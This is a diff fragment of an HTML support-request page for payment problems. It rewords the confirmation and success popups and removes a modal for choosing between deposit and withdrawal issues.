+    <div class="confirm-list" id="confirmList"></div>
+    <button class="popup-btn popup-btn-outline" onclick="closeConfirm()"><svg class="svg-icon"><use href="#icon-arrow-left"></use></svg> Edit Details</button>
+    <button class="popup-btn" onclick="confirmVerificationSubmit()" id="confirmSubmitBtn"><span class="btn-text">Confirm &amp; Submit</span><div class="spinner"></div></button>
+  </div>
+</div>
+
 <div class="overlay" id="successOverlay">
   <div class="popup">
     <div class="popup-icon"><svg class="svg-icon"><use href="#icon-check"></use></svg></div>
-    <h2 id="successTitle">Submitted!</h2>
+    <h2 id="successTitle">Request Submitted Successfully!</h2>
     <div class="trusted-text"><svg class="svg-icon"><use href="#icon-shield"></use></svg> Trusted &amp; Secure <svg class="svg-icon"><use href="#icon-lock"></use></svg></div>
-    <p id="successDesc">Your form has been submitted successfully. Our team will review it shortly.</p>
+    <p id="successDesc">Your request has been sent to the support team. We will verify it and get back to you soon.</p>
     <button class="popup-btn" onclick="closePopup()"><svg class="svg-icon"><use href="#icon-thumbs-up"></use></svg> Got it!</button>
     <div class="auto-close-bar" id="autoCloseBar"><div class="auto-close-fill" id="autoCloseFill"></div></div>
   </div>
 </div>
 
 <div class="confetti-container" id="confettiContainer"></div>
-
-<div class="issue-overlay" id="issueOverlay" onclick="if(event.target===this)closeIssuePopup()">
-  <div class="issue-modal">
-    <div class="issue-modal-icon"><svg class="svg-icon"><use href="#icon-card"></use></svg></div>
-    <h3>Select Problem Type</h3>
-    <p>Choose the type of payment issue you are facing</p>
-    <button class="issue-option" onclick="chooseIssue('deposit')">
-      <div class="issue-option-icon deposit"><svg class="svg-icon"><use href="#icon-arrow-down-circle"></use></svg></div>
-      <div class="issue-option-text">
-        <div class="issue-option-title">Deposit Problem</div>
-        <div class="issue-option-sub">Deposit not credited · Double debit · UTR issue</div>
-      </div>
-      <div class="issue-option-arrow">→</div>
-    </button>
-    <button class="issue-option" onclick="chooseIssue('withdrawal')">
-      <div class="issue-option-icon withdrawal"><svg class="svg-icon"><use href="#icon-bank"></use></svg></div>
-      <div class="issue-option-text">
-        <div class="issue-option-title">Withdrawal Problem</div>
-        <div class="issue-option-sub">Withdrawal pending · Failed · Not received</div>
-      </div>
-      <div class="issue-option-arrow">→</div>
-    </button>
-    <button class="issue-cancel" onclick="closeIssuePopup()">Cancel</button>
-  </div>
-</div>
 
 <script src="app.js" defer></script>
 </body>
